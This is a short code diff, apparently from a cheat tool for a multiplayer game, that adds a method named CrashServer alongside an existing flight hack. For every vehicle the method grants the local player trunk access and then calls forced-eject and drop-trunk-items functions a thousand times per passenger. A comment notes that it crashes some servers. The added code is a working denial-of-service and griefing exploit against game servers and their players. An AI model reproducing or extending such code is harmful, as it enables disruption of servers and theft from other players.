@@ -15,7 +15,25 @@ namespace Hag.Misc
         {
             StartCoroutine(Flight());
         }
+        void CrashServer()
+        {
+            foreach (Esp_Objects.BaseVehicle vehicle in Globals.VehicleList)
+            {
 
+                vehicle.Entity.grantTrunkAccess(Globals.LocalPlayer);
+
+                foreach (Passenger ph in vehicle.Entity.passengers)
+                {
+                    for (int i = 0; i < 1000; i++)
+                    {
+                        vehicle.Entity.forceRemoveAllPlayers();
+                        vehicle.Entity.dropTrunkItems();
+                    }
+
+                } // seems to crash some servers from time to time
+            }
+
+        }
         IEnumerator Flight()
         {
             for (; ; )
